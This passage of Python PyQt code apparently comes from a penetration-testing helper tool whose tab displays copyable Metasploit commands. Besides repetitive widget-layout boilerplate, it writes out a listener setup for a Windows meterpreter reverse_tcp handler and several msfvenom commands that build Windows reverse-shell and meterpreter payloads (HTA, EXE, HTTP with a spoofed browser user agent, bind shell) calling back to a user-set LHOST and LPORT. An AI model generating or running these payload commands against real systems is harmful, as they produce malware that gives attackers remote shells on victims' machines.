        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_listener_Scan1_Copy)
        label_layout.addWidget(self.msfv_listener_Scan1)
        self.tab7_container_layout.insertLayout(38, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_listener_divider1
        if hasattr(self, 'msfv_listener_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_divider1)
            self.msfv_listener_divider1.deleteLater()
        self.msfv_listener_divider1 = QFrame()
        self.msfv_listener_divider1.setFrameShape(QFrame.HLine)
        self.msfv_listener_divider1.setLineWidth(3)
        self.msfv_listener_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_listener_divider2
        if hasattr(self, 'msfv_listener_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_divider2)
            self.msfv_listener_divider2.deleteLater()
        self.msfv_listener_divider2 = QFrame()
        self.msfv_listener_divider2.setFrameShape(QFrame.HLine)
        self.msfv_listener_divider2.setLineWidth(3)
        self.msfv_listener_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_listener_spacer1
        if hasattr(self, 'msfv_listener_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer1)
            self.msfv_listener_spacer1.deleteLater()
        self.msfv_listener_spacer1 = QLabel()
        self.msfv_listener_spacer1.setFixedWidth(40)
        self.msfv_listener_spacer1.setFixedHeight(50)
     
        # msfv_listener_spacer2
        if hasattr(self, 'msfv_listener_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer2)
            self.msfv_listener_spacer2.deleteLater()
        self.msfv_listener_spacer2 = QLabel()
        self.msfv_listener_spacer2.setFixedWidth(40)
        self.msfv_listener_spacer2.setFixedHeight(50)
     
        # msfv_listener spacer & divider layout
        self.tab7_container_layout.insertWidget(39, self.msfv_listener_spacer1)
        self.tab7_container_layout.insertWidget(40, self.msfv_listener_divider1)
        self.tab7_container_layout.insertWidget(41, self.msfv_listener_divider2)
        self.tab7_container_layout.insertWidget(42, self.msfv_listener_spacer2)
        self.tab7_container_layout.addStretch()
     
        # msfv_listener_Scan2
        if hasattr(self, 'msfv_listener_Scan2'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan2)
            self.msfv_listener_Scan2.deleteLater()
        self.msfv_listener_Scan2 = QLabel("set payload windows/meterpreter/reverse_tcp")
        self.msfv_listener_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(43,self.msfv_listener_Scan2)
     
        # msfv_listener_Scan2_Copy
        if hasattr(self, 'msfv_listener_Scan2_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan2_Copy)
            self.msfv_listener_Scan2_Copy.deleteLater()
        self.msfv_listener_Scan2_Copy = QPushButton()
        self.msfv_listener_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_listener_Scan2_Copy.setFixedSize(QSize(20,20))
        self.msfv_listener_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_listener_Scan2.text()))
        self.msfv_listener_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_listener_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_listener_Scan2_Copy)
        label_layout.addWidget(self.msfv_listener_Scan2)
        self.tab7_container_layout.insertLayout(44, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_listener_divider1
        if hasattr(self, 'msfv_listener_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_divider1)
            self.msfv_listener_divider1.deleteLater()
        self.msfv_listener_divider1 = QFrame()
        self.msfv_listener_divider1.setFrameShape(QFrame.HLine)
        self.msfv_listener_divider1.setLineWidth(3)
        self.msfv_listener_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_listener_divider2
        if hasattr(self, 'msfv_listener_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_divider2)
            self.msfv_listener_divider2.deleteLater()
        self.msfv_listener_divider2 = QFrame()
        self.msfv_listener_divider2.setFrameShape(QFrame.HLine)
        self.msfv_listener_divider2.setLineWidth(3)
        self.msfv_listener_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_listener_spacer1
        if hasattr(self, 'msfv_listener_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer1)
            self.msfv_listener_spacer1.deleteLater()
        self.msfv_listener_spacer1 = QLabel()
        self.msfv_listener_spacer1.setFixedWidth(40)
        self.msfv_listener_spacer1.setFixedHeight(50)
     
        # msfv_listener_spacer2
        if hasattr(self, 'msfv_listener_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer2)
            self.msfv_listener_spacer2.deleteLater()
        self.msfv_listener_spacer2 = QLabel()
        self.msfv_listener_spacer2.setFixedWidth(40)
        self.msfv_listener_spacer2.setFixedHeight(50)
     
        # msfv_listener spacer & divider layout
        self.tab7_container_layout.insertWidget(45, self.msfv_listener_spacer1)
        self.tab7_container_layout.insertWidget(46, self.msfv_listener_divider1)
        self.tab7_container_layout.insertWidget(47, self.msfv_listener_divider2)
        self.tab7_container_layout.insertWidget(48, self.msfv_listener_spacer2)
        self.tab7_container_layout.addStretch()
     
        # msfv_listener_Scan3
        if hasattr(self, 'msfv_listener_Scan3'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan3)
            self.msfv_listener_Scan3.deleteLater()
        self.msfv_listener_Scan3 = QLabel("set lhost " + self.lhost + "")
        self.msfv_listener_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(49,self.msfv_listener_Scan3)
     
        # msfv_listener_Scan3_Copy
        if hasattr(self, 'msfv_listener_Scan3_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan3_Copy)
            self.msfv_listener_Scan3_Copy.deleteLater()
        self.msfv_listener_Scan3_Copy = QPushButton()
        self.msfv_listener_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_listener_Scan3_Copy.setFixedSize(QSize(20,20))
        self.msfv_listener_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_listener_Scan3.text()))
        self.msfv_listener_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_listener_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_listener_Scan3_Copy)
        label_layout.addWidget(self.msfv_listener_Scan3)
        self.tab7_container_layout.insertLayout(50, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_listener_divider1
        if hasattr(self, 'msfv_listener_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_divider1)
            self.msfv_listener_divider1.deleteLater()
        self.msfv_listener_divider1 = QFrame()
        self.msfv_listener_divider1.setFrameShape(QFrame.HLine)
        self.msfv_listener_divider1.setLineWidth(3)
        self.msfv_listener_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_listener_divider2
        if hasattr(self, 'msfv_listener_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_divider2)
            self.msfv_listener_divider2.deleteLater()
        self.msfv_listener_divider2 = QFrame()
        self.msfv_listener_divider2.setFrameShape(QFrame.HLine)
        self.msfv_listener_divider2.setLineWidth(3)
        self.msfv_listener_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_listener_spacer1
        if hasattr(self, 'msfv_listener_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer1)
            self.msfv_listener_spacer1.deleteLater()
        self.msfv_listener_spacer1 = QLabel()
        self.msfv_listener_spacer1.setFixedWidth(40)
        self.msfv_listener_spacer1.setFixedHeight(50)
     
        # msfv_listener_spacer2
        if hasattr(self, 'msfv_listener_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer2)
            self.msfv_listener_spacer2.deleteLater()
        self.msfv_listener_spacer2 = QLabel()
        self.msfv_listener_spacer2.setFixedWidth(40)
        self.msfv_listener_spacer2.setFixedHeight(50)
     
        # msfv_listener spacer & divider layout
        self.tab7_container_layout.insertWidget(51, self.msfv_listener_spacer1)
        self.tab7_container_layout.insertWidget(52, self.msfv_listener_divider1)
        self.tab7_container_layout.insertWidget(53, self.msfv_listener_divider2)
        self.tab7_container_layout.insertWidget(54, self.msfv_listener_spacer2)
        self.tab7_container_layout.addStretch()
     
        # msfv_listener_Scan4
        if hasattr(self, 'msfv_listener_Scan4'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan4)
            self.msfv_listener_Scan4.deleteLater()
        self.msfv_listener_Scan4 = QLabel("set lport " + self.lport + "")
        self.msfv_listener_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(55,self.msfv_listener_Scan4)
     
        # msfv_listener_Scan4_Copy
        if hasattr(self, 'msfv_listener_Scan4_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan4_Copy)
            self.msfv_listener_Scan4_Copy.deleteLater()
        self.msfv_listener_Scan4_Copy = QPushButton()
        self.msfv_listener_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_listener_Scan4_Copy.setFixedSize(QSize(20,20))
        self.msfv_listener_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_listener_Scan4.text()))
        self.msfv_listener_Scan4_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_listener_Scan4 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_listener_Scan4_Copy)
        label_layout.addWidget(self.msfv_listener_Scan4)
        self.tab7_container_layout.insertLayout(56, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_listener_divider1
        if hasattr(self, 'msfv_listener_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_divider1)
            self.msfv_listener_divider1.deleteLater()
        self.msfv_listener_divider1 = QFrame()
        self.msfv_listener_divider1.setFrameShape(QFrame.HLine)
        self.msfv_listener_divider1.setLineWidth(3)
        self.msfv_listener_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_listener_divider2
        if hasattr(self, 'msfv_listener_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_divider2)
            self.msfv_listener_divider2.deleteLater()
        self.msfv_listener_divider2 = QFrame()
        self.msfv_listener_divider2.setFrameShape(QFrame.HLine)
        self.msfv_listener_divider2.setLineWidth(3)
        self.msfv_listener_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_listener_spacer1
        if hasattr(self, 'msfv_listener_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer1)
            self.msfv_listener_spacer1.deleteLater()
        self.msfv_listener_spacer1 = QLabel()
        self.msfv_listener_spacer1.setFixedWidth(40)
        self.msfv_listener_spacer1.setFixedHeight(50)
     
        # msfv_listener_spacer2
        if hasattr(self, 'msfv_listener_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer2)
            self.msfv_listener_spacer2.deleteLater()
        self.msfv_listener_spacer2 = QLabel()
        self.msfv_listener_spacer2.setFixedWidth(40)
        self.msfv_listener_spacer2.setFixedHeight(50)
     
        # msfv_listener spacer & divider layout
        self.tab7_container_layout.insertWidget(57, self.msfv_listener_spacer1)
        self.tab7_container_layout.insertWidget(58, self.msfv_listener_divider1)
        self.tab7_container_layout.insertWidget(59, self.msfv_listener_divider2)
        self.tab7_container_layout.insertWidget(60, self.msfv_listener_spacer2)
        self.tab7_container_layout.addStretch()
     
        # msfv_listener_Scan5
        if hasattr(self, 'msfv_listener_Scan5'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan5)
            self.msfv_listener_Scan5.deleteLater()
        self.msfv_listener_Scan5 = QLabel("set ExitOnSession false")
        self.msfv_listener_Scan5.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(61,self.msfv_listener_Scan5)
     
        # msfv_listener_Scan5_Copy
        if hasattr(self, 'msfv_listener_Scan5_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan5_Copy)
            self.msfv_listener_Scan5_Copy.deleteLater()
        self.msfv_listener_Scan5_Copy = QPushButton()
        self.msfv_listener_Scan5_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_listener_Scan5_Copy.setFixedSize(QSize(20,20))
        self.msfv_listener_Scan5_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_listener_Scan5.text()))
        self.msfv_listener_Scan5_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_listener_Scan5 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_listener_Scan5_Copy)
        label_layout.addWidget(self.msfv_listener_Scan5)
        self.tab7_container_layout.insertLayout(62, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_listener_divider1
        if hasattr(self, 'msfv_listener_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_divider1)
            self.msfv_listener_divider1.deleteLater()
        self.msfv_listener_divider1 = QFrame()
        self.msfv_listener_divider1.setFrameShape(QFrame.HLine)
        self.msfv_listener_divider1.setLineWidth(3)
        self.msfv_listener_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_listener_divider2
        if hasattr(self, 'msfv_listener_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_divider2)
            self.msfv_listener_divider2.deleteLater()
        self.msfv_listener_divider2 = QFrame()
        self.msfv_listener_divider2.setFrameShape(QFrame.HLine)
        self.msfv_listener_divider2.setLineWidth(3)
        self.msfv_listener_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_listener_spacer1
        if hasattr(self, 'msfv_listener_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer1)
            self.msfv_listener_spacer1.deleteLater()
        self.msfv_listener_spacer1 = QLabel()
        self.msfv_listener_spacer1.setFixedWidth(40)
        self.msfv_listener_spacer1.setFixedHeight(50)
     
        # msfv_listener_spacer2
        if hasattr(self, 'msfv_listener_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer2)
            self.msfv_listener_spacer2.deleteLater()
        self.msfv_listener_spacer2 = QLabel()
        self.msfv_listener_spacer2.setFixedWidth(40)
        self.msfv_listener_spacer2.setFixedHeight(50)
     
        # msfv_listener spacer & divider layout
        self.tab7_container_layout.insertWidget(63, self.msfv_listener_spacer1)
        self.tab7_container_layout.insertWidget(64, self.msfv_listener_divider1)
        self.tab7_container_layout.insertWidget(65, self.msfv_listener_divider2)
        self.tab7_container_layout.insertWidget(66, self.msfv_listener_spacer2)
        self.tab7_container_layout.addStretch()
     
        # msfv_listener_Scan6
        if hasattr(self, 'msfv_listener_Scan6'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan6)
            self.msfv_listener_Scan6.deleteLater()
        self.msfv_listener_Scan6 = QLabel("exploit -j")
        self.msfv_listener_Scan6.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(67,self.msfv_listener_Scan6)
     
        # msfv_listener_Scan6_Copy
        if hasattr(self, 'msfv_listener_Scan6_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan6_Copy)
            self.msfv_listener_Scan6_Copy.deleteLater()
        self.msfv_listener_Scan6_Copy = QPushButton()
        self.msfv_listener_Scan6_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_listener_Scan6_Copy.setFixedSize(QSize(20,20))
        self.msfv_listener_Scan6_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_listener_Scan6.text()))
        self.msfv_listener_Scan6_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_listener_Scan6 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_listener_Scan6_Copy)
        label_layout.addWidget(self.msfv_listener_Scan6)
        self.tab7_container_layout.insertLayout(68, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_listener_divider1
        if hasattr(self, 'msfv_listener_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_divider1)
            self.msfv_listener_divider1.deleteLater()
        self.msfv_listener_divider1 = QFrame()
        self.msfv_listener_divider1.setFrameShape(QFrame.HLine)
        self.msfv_listener_divider1.setLineWidth(3)
        self.msfv_listener_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_listener_divider2
        if hasattr(self, 'msfv_listener_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_divider2)
            self.msfv_listener_divider2.deleteLater()
        self.msfv_listener_divider2 = QFrame()
        self.msfv_listener_divider2.setFrameShape(QFrame.HLine)
        self.msfv_listener_divider2.setLineWidth(3)
        self.msfv_listener_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_listener_spacer1
        if hasattr(self, 'msfv_listener_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer1)
            self.msfv_listener_spacer1.deleteLater()
        self.msfv_listener_spacer1 = QLabel()
        self.msfv_listener_spacer1.setFixedWidth(40)
        self.msfv_listener_spacer1.setFixedHeight(50)
     
        # msfv_listener_spacer2
        if hasattr(self, 'msfv_listener_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer2)
            self.msfv_listener_spacer2.deleteLater()
        self.msfv_listener_spacer2 = QLabel()
        self.msfv_listener_spacer2.setFixedWidth(40)
        self.msfv_listener_spacer2.setFixedHeight(50)
     
        # msfv_listener spacer & divider layout
        self.tab7_container_layout.insertWidget(69, self.msfv_listener_spacer1)
        self.tab7_container_layout.insertWidget(70, self.msfv_listener_divider1)
        self.tab7_container_layout.insertWidget(71, self.msfv_listener_divider2)
        self.tab7_container_layout.insertWidget(72, self.msfv_listener_spacer2)
        self.tab7_container_layout.addStretch()
     
    # msfv_windows
        if hasattr(self, 'msfv_windows'):
            self.tab7_container_layout.removeWidget(self.msfv_windows)
            self.msfv_windows.deleteLater()
        self.msfv_windows = QLabel("[+ Windows Payloads ]")
        self.msfv_windows.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(73,self.msfv_windows)
     
        # msfv_windows_Scan1
        if hasattr(self, 'msfv_windows_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan1)
            self.msfv_windows_Scan1.deleteLater()
        self.msfv_windows_Scan1 = QLabel("msfvenom -p windows/x64/shell_reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f hta-psh -o shell.hta")
        self.msfv_windows_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(74,self.msfv_windows_Scan1)
     
        # msfv_windows_Scan1_Copy
        if hasattr(self, 'msfv_windows_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan1_Copy)
            self.msfv_windows_Scan1_Copy.deleteLater()
        self.msfv_windows_Scan1_Copy = QPushButton()
        self.msfv_windows_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_windows_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_windows_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_windows_Scan1.text()))
        self.msfv_windows_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_windows_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_windows_Scan1_Copy)
        label_layout.addWidget(self.msfv_windows_Scan1)
        self.tab7_container_layout.insertLayout(75, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_windows_divider1
        if hasattr(self, 'msfv_windows_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_divider1)
            self.msfv_windows_divider1.deleteLater()
        self.msfv_windows_divider1 = QFrame()
        self.msfv_windows_divider1.setFrameShape(QFrame.HLine)
        self.msfv_windows_divider1.setLineWidth(3)
        self.msfv_windows_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_windows_divider2
        if hasattr(self, 'msfv_windows_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_divider2)
            self.msfv_windows_divider2.deleteLater()
        self.msfv_windows_divider2 = QFrame()
        self.msfv_windows_divider2.setFrameShape(QFrame.HLine)
        self.msfv_windows_divider2.setLineWidth(3)
        self.msfv_windows_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_windows_spacer1
        if hasattr(self, 'msfv_windows_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer1)
            self.msfv_windows_spacer1.deleteLater()
        self.msfv_windows_spacer1 = QLabel()
        self.msfv_windows_spacer1.setFixedWidth(40)
        self.msfv_windows_spacer1.setFixedHeight(50)
     
        # msfv_windows_spacer2
        if hasattr(self, 'msfv_windows_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer2)
            self.msfv_windows_spacer2.deleteLater()
        self.msfv_windows_spacer2 = QLabel()
        self.msfv_windows_spacer2.setFixedWidth(40)
        self.msfv_windows_spacer2.setFixedHeight(50)
     
        # msfv_windows spacer & divider layout
        self.tab7_container_layout.insertWidget(76, self.msfv_windows_spacer1)
        self.tab7_container_layout.insertWidget(77, self.msfv_windows_divider1)
        self.tab7_container_layout.insertWidget(78, self.msfv_windows_divider2)
        self.tab7_container_layout.insertWidget(79, self.msfv_windows_spacer2)
        self.tab7_container_layout.addStretch()
     
        # msfv_windows_Scan2
        if hasattr(self, 'msfv_windows_Scan2'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan2)
            self.msfv_windows_Scan2.deleteLater()
        self.msfv_windows_Scan2 = QLabel("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f exe > shell.exe")
        self.msfv_windows_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(80,self.msfv_windows_Scan2)
     
        # msfv_windows_Scan2_Copy
        if hasattr(self, 'msfv_windows_Scan2_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan2_Copy)
            self.msfv_windows_Scan2_Copy.deleteLater()
        self.msfv_windows_Scan2_Copy = QPushButton()
        self.msfv_windows_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_windows_Scan2_Copy.setFixedSize(QSize(20,20))
        self.msfv_windows_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_windows_Scan2.text()))
        self.msfv_windows_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_windows_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_windows_Scan2_Copy)
        label_layout.addWidget(self.msfv_windows_Scan2)
        self.tab7_container_layout.insertLayout(81, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_windows_divider1
        if hasattr(self, 'msfv_windows_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_divider1)
            self.msfv_windows_divider1.deleteLater()
        self.msfv_windows_divider1 = QFrame()
        self.msfv_windows_divider1.setFrameShape(QFrame.HLine)
        self.msfv_windows_divider1.setLineWidth(3)
        self.msfv_windows_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_windows_divider2
        if hasattr(self, 'msfv_windows_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_divider2)
            self.msfv_windows_divider2.deleteLater()
        self.msfv_windows_divider2 = QFrame()
        self.msfv_windows_divider2.setFrameShape(QFrame.HLine)
        self.msfv_windows_divider2.setLineWidth(3)
        self.msfv_windows_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_windows_spacer1
        if hasattr(self, 'msfv_windows_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer1)
            self.msfv_windows_spacer1.deleteLater()
        self.msfv_windows_spacer1 = QLabel()
        self.msfv_windows_spacer1.setFixedWidth(40)
        self.msfv_windows_spacer1.setFixedHeight(50)
     
        # msfv_windows_spacer2
        if hasattr(self, 'msfv_windows_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer2)
            self.msfv_windows_spacer2.deleteLater()
        self.msfv_windows_spacer2 = QLabel()
        self.msfv_windows_spacer2.setFixedWidth(40)
        self.msfv_windows_spacer2.setFixedHeight(50)
     
        # msfv_windows spacer & divider layout
        self.tab7_container_layout.insertWidget(82, self.msfv_windows_spacer1)
        self.tab7_container_layout.insertWidget(83, self.msfv_windows_divider1)
        self.tab7_container_layout.insertWidget(84, self.msfv_windows_divider2)
        self.tab7_container_layout.insertWidget(85, self.msfv_windows_spacer2)
        self.tab7_container_layout.addStretch()
     
        # msfv_windows_Scan3
        if hasattr(self, 'msfv_windows_Scan3'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan3)
            self.msfv_windows_Scan3.deleteLater()
        self.msfv_windows_Scan3 = QLabel("msfvenom -p windows/meterpreter_reverse_http LHOST=" + self.lhost + " LPORT=" + self.lport + " HttpUserAgent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\" -f exe > shell.exe")
        self.msfv_windows_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(86,self.msfv_windows_Scan3)
     
        # msfv_windows_Scan3_Copy
        if hasattr(self, 'msfv_windows_Scan3_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan3_Copy)
            self.msfv_windows_Scan3_Copy.deleteLater()
        self.msfv_windows_Scan3_Copy = QPushButton()
        self.msfv_windows_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_windows_Scan3_Copy.setFixedSize(QSize(20,20))
        self.msfv_windows_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_windows_Scan3.text()))
        self.msfv_windows_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_windows_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_windows_Scan3_Copy)
        label_layout.addWidget(self.msfv_windows_Scan3)
        self.tab7_container_layout.insertLayout(87, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_windows_divider1
        if hasattr(self, 'msfv_windows_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_divider1)
            self.msfv_windows_divider1.deleteLater()
        self.msfv_windows_divider1 = QFrame()
        self.msfv_windows_divider1.setFrameShape(QFrame.HLine)
        self.msfv_windows_divider1.setLineWidth(3)
        self.msfv_windows_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_windows_divider2
        if hasattr(self, 'msfv_windows_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_divider2)
            self.msfv_windows_divider2.deleteLater()
        self.msfv_windows_divider2 = QFrame()
        self.msfv_windows_divider2.setFrameShape(QFrame.HLine)
        self.msfv_windows_divider2.setLineWidth(3)
        self.msfv_windows_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_windows_spacer1
        if hasattr(self, 'msfv_windows_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer1)
            self.msfv_windows_spacer1.deleteLater()
        self.msfv_windows_spacer1 = QLabel()
        self.msfv_windows_spacer1.setFixedWidth(40)
        self.msfv_windows_spacer1.setFixedHeight(50)
     
        # msfv_windows_spacer2
        if hasattr(self, 'msfv_windows_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer2)
            self.msfv_windows_spacer2.deleteLater()
        self.msfv_windows_spacer2 = QLabel()
        self.msfv_windows_spacer2.setFixedWidth(40)
        self.msfv_windows_spacer2.setFixedHeight(50)
     
        # msfv_windows spacer & divider layout
        self.tab7_container_layout.insertWidget(88, self.msfv_windows_spacer1)
        self.tab7_container_layout.insertWidget(89, self.msfv_windows_divider1)
        self.tab7_container_layout.insertWidget(90, self.msfv_windows_divider2)
        self.tab7_container_layout.insertWidget(91, self.msfv_windows_spacer2)
        self.tab7_container_layout.addStretch()
     
        # msfv_windows_Scan4
        if hasattr(self, 'msfv_windows_Scan4'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan4)
            self.msfv_windows_Scan4.deleteLater()
        self.msfv_windows_Scan4 = QLabel("msfvenom -p windows/meterpreter/bind_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f exe > shell.exe")
        self.msfv_windows_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(92,self.msfv_windows_Scan4)
     
        # msfv_windows_Scan4_Copy
        if hasattr(self, 'msfv_windows_Scan4_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan4_Copy)
            self.msfv_windows_Scan4_Copy.deleteLater()
        self.msfv_windows_Scan4_Copy = QPushButton()
        self.msfv_windows_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_windows_Scan4_Copy.setFixedSize(QSize(20,20))
        self.msfv_windows_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_windows_Scan4.text()))
        self.msfv_windows_Scan4_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_windows_Scan4 adding Widgets
        label_layout = QHBoxLayout()
